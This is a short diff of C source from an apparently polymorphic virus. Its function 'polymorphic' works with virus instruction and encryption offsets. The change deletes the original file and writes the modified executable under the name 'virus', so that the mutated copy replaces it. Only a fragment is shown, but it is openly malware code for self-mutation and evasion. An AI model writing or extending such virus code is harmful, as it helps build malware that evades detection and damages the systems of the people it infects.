@@ -76,9 +76,10 @@ int polymorphic(unsigned long virus_instruction_begin, unsigned long virus_encry
 
 	}
 
+	remove(filename);
 
 
-	FILE* out_file = fopen("virus_mod", "wb");
+	FILE* out_file = fopen("virus", "wb");
 	// write the modified executable data
 	fwrite(string, fsize, 1, out_file);
 	fclose(out_file);
